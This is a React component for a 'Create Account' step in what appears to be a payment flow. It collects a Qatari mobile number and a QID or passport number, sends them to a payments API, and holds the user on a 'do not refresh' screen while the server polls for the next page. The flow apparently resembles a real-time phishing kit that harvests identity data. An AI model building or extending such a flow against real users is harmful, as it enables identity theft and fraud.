import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { UserPlus } from "lucide-react";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import styles from "./FlowPages.module.scss";

export function FlowRegisterPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [mobile, setMobile] = useState("");
  const [qid, setQid] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "register",
    enabled: submitted && !!reference,
  });

  const handleSubmit = async () => {
    if (!mobile.trim() || !qid.trim()) {
      setError("Please fill all fields");
      return;
    }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "register_submitted", {
        mobile,
        qatari_id_or_passport: qid,
      });
      setSubmitted(true);
    } catch {
      setError("Network error — please try again");
    } finally {
      setBusy(false);
    }
  };

  if (!reference) {
    navigate("/", { replace: true });
    return null;
  }

  return (
    <div className={styles.flowPage}>
      <div className={styles.flowCard}>
        <div className={styles.flowLogo}>
          <UserPlus size={44} color="#8b1a3a" />
        </div>

        <p className={styles.flowTitle}>Create Account</p>
        <p className={styles.flowSubtitle}>Enter your details to register</p>

        {error && <div className={styles.formError}>{error}</div>}

        <div className={styles.formField}>
          <label className={styles.formLabel}>Mobile (+974)</label>
          <input
            type="tel"
            className={styles.formInput}
            placeholder="e.g. 55123456"
            value={mobile}
            inputMode="tel"
            onChange={(e) =>
              setMobile(e.target.value.replace(/\D/g, ""))
            }
            onKeyDown={(e) => e.key === "Enter" && handleSubmit()}
          />
        </div>

        <div className={styles.formField}>
          <label className={styles.formLabel}>QID / Passport Number</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="QID or Passport"
            value={qid}
            onChange={(e) => setQid(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && handleSubmit()}
          />
        </div>

        <button
          className={styles.submitBtn}
          onClick={handleSubmit}
          disabled={busy || submitted}
        >
          {busy ? "Creating account…" : "Create Account"}
        </button>
      </div>

      {submitted && (
        <div className={styles.loadingOverlay}>
          <div className={styles.loadingCard}>
            <div className={styles.spinnerWrap}>
              <div className={styles.spinnerOuter} />
              <div className={styles.spinnerInner} />
            </div>
            <p className={styles.loadingTitle}>Please wait</p>
            <p className={styles.loadingSubtitle}>
              Processing your information
            </p>
            <div className={styles.loadingNoteBox}>
              <p className={styles.loadingNote}>
                Please do not leave or refresh this page until the process is
                complete
              </p>
            </div>
            <div className={styles.dots}>
              <span className={styles.dot} />
              <span className={styles.dotActive} />
              <span className={styles.dot} />
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
